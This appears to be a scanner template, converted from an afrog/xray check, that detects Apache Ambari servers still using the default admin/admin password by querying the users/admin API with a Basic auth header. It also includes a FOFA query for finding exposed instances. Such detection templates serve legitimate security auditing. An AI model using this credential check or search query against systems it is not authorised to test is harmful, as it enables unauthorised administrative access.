# 来源: afrog（转换自 afrog/xray 表达式 POC）
http:
  - headers:
      Authorization: Basic YWRtaW46YWRtaW4=
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - PrivilegeInfo
          - AMBARI.
        condition: and
    method: GET
    path:
      - '{{BaseURL}}/api/v1/users/admin?fields=*,privileges/PrivilegeInfo/cluster_name,privileges/PrivilegeInfo/permission_name'
id: ambari-default-password
info:
  author: wulalalaaa
  description: |-
    An Apache Ambari default admin login was discovered. default password: admin/admin
    fofa: app="APACHE-Ambari"
  metadata:
    argus-execution-class: detection
    argus-import-license: MIT License
    argus-import-source: afrog
    argus-risk-level: high
  name: Apache Ambari Default Password
  severity: high
  tags: ambari,default-login,apache,argus-import
